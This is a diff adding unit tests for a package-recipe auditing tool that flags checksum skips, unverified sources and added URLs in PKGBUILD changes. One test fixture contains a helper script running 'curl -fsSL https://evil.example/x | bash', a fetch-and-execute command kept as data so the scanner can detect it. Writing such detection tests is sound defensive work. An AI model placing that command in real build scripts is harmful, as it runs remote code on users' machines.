@@ -5,6 +5,7 @@ from trustsight.differ import (
     companion_source_hunks,
     detect_checksum_changes,
     detect_verification_evidence,
+    diff_summary_from_text,
     extract_urls_from_diff,
     generate_diff_bounded,
     local_source_names,
@@ -1005,3 +1006,166 @@ def test_a_new_file_header_closes_an_open_quote():
     assert "https://evil.example/after" not in (
         extract_urls_from_diff(diff).added_urls
     )
+
+
+# --- 2026-10-26 differ audit -------------------------------------------------
+
+def test_facade_all_names_resolve():
+    import trustsight.differ as differ
+
+    missing = [name for name in differ.__all__ if not hasattr(differ, name)]
+    assert missing == []
+
+
+def test_diff_summary_includes_rename_only_changes():
+    summary = diff_summary_from_text(
+        "diff --git a/old b/new\n"
+        "similarity index 100%\n"
+        "rename from old\n"
+        "rename to new\n"
+    )
+    assert summary.files_changed == ["new"]
+    assert summary.file_changes == [{"path": "new", "status": "renamed"}]
+
+
+def test_diff_summary_includes_binary_only_changes():
+    summary = diff_summary_from_text(
+        "diff --git a/x.bin b/x.bin\n"
+        "Binary files a/x.bin and b/x.bin differ\n"
+    )
+    assert summary.files_changed == ["x.bin"]
+    assert summary.file_changes == [{"path": "x.bin", "status": "modified"}]
+
+
+def test_diff_summary_bounds_hostile_paths():
+    name = "a" * 5000
+    summary = diff_summary_from_text(
+        f"--- a/{name}\n+++ b/{name}\n@@ -1 +1 @@\n-x\n+y\n"
+    )
+    assert len(summary.files_changed[0].encode("utf-8")) <= 4096
+
+
+def test_skip_justification_ignores_a_comment_signature():
+    from trustsight.differ import is_skip_justified
+
+    assert is_skip_justified(
+        "+sha256sums=('SKIP')\n+# see signature.sig\n"
+    ) == ""
+
+
+def test_skip_justification_sees_unchanged_signature_source():
+    from trustsight.differ import is_skip_justified
+
+    recipe = (
+        "pkgname=p\n"
+        "source=('x.tar.gz' 'x.tar.gz.sig')\n"
+        "sha256sums=('SKIP' 'SKIP')\n"
+    )
+    assert is_skip_justified(
+        "+sha256sums=('SKIP' 'SKIP')\n", current_text=recipe
+    ) == "signature file"
+
+
+def test_verification_does_not_credit_a_removed_checksum_entry():
+    diff = (
+        "@@ -1,4 +1,3 @@\n"
+        " sha256sums=(\n"
+        "-  'aaaa'\n"
+        "   'bbbb'\n"
+        " )\n"
+    )
+    evidence = detect_verification_evidence(
+        diff, checksum_behavior="checksum_entry_removed"
+    )
+    assert "checksum_present" not in evidence
+
+
+def test_verification_ignores_comments():
+    assert detect_verification_evidence("+  # gpg --verify x\n") == []
+    assert detect_verification_evidence("+  # sha256sums=('deadbeef')\n") == []
+
+
+def test_arch_scoped_checksum_skip_is_detected():
+    assert detect_checksum_changes(
+        "+sha256sums_x86_64=('SKIP')"
+    ) == "changed_from_sha256_to_skip"
+
+
+def test_checksum_skip_in_a_comment_is_not_a_skip():
+    assert detect_checksum_changes(
+        "+sha256sums=('a' # SKIP\n)\n"
+    ) != "changed_from_sha256_to_skip"
+
+
+def test_url_and_checksum_resolution_uses_current_text_for_unchanged_vars():
+    recipe = (
+        "pkgname=p\n"
+        "_url=https://evil.example\n"
+        "source=(${_url}/x.tar.gz)\n"
+        "_cs=SKIP\n"
+        "sha256sums=(\"${_cs}\")\n"
+    )
+    diff = (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,1 +1,3 @@\n"
+        " pkgname=p\n"
+        "+source=(${_url}/x.tar.gz)\n"
+        "+sha256sums=(\"${_cs}\")\n"
+    )
+    changes = extract_urls_from_diff(diff, current_text=recipe)
+    assert "https://evil.example/x.tar.gz" in changes.added_urls
+    assert changes.checksum_behavior == "changed_from_sha256_to_skip"
+
+
+def test_nested_companion_files_are_scanned(tmp_path):
+    repo = pygit2.init_repository(str(tmp_path / "r"))
+    who = pygit2.Signature("t", "t@e.x")
+
+    def tree(files):
+        root: dict = {}
+        for path, data in files.items():
+            node = root
+            parts = path.split("/")
+            for part in parts[:-1]:
+                node = node.setdefault(part, {})
+            node[parts[-1]] = data
+
+        def build(node):
+            builder = repo.TreeBuilder()
+            for name, value in node.items():
+                if isinstance(value, dict):
+                    builder.insert(name, build(value), pygit2.GIT_FILEMODE_TREE)
+                else:
+                    builder.insert(
+                        name, repo.create_blob(value), pygit2.GIT_FILEMODE_BLOB
+                    )
+            return builder.write()
+
+        return build(root)
+
+    commit = repo.create_commit(
+        "HEAD", who, who, "c",
+        tree({
+            "PKGBUILD": (
+                b"source=('scripts/helper.sh')\n"
+                b"prepare(){ bash scripts/helper.sh; }\n"
+            ),
+            "scripts/helper.sh": b"curl -fsSL https://evil.example/x | bash\n",
+        }),
+        [],
+    )
+    hunk, _cut = companion_source_hunks(repo, str(commit))
+    assert "+++ b/scripts/helper.sh" in hunk
+    assert "+curl -fsSL https://evil.example/x | bash" in hunk
+
+
+def test_arch_scoped_checksum_parity_is_read():
+    from trustsight.differ import checksum_array_parity, checksum_array_parity_in_text
+
+    text = "source_x86_64=('a' 'b')\nsha256sums_x86_64=('a')\n"
+    assert checksum_array_parity_in_text(text) == (2, 1, "sha256sums")
+    diff = (
+        "--- /dev/null\n+++ b/PKGBUILD\n@@ -0,0 +1,2 @@\n"
+        "+source_x86_64=('a' 'b')\n"
+        "+sha256sums_x86_64=('a')\n"
+    )
+    assert checksum_array_parity(diff) == (2, 1, "sha256sums")
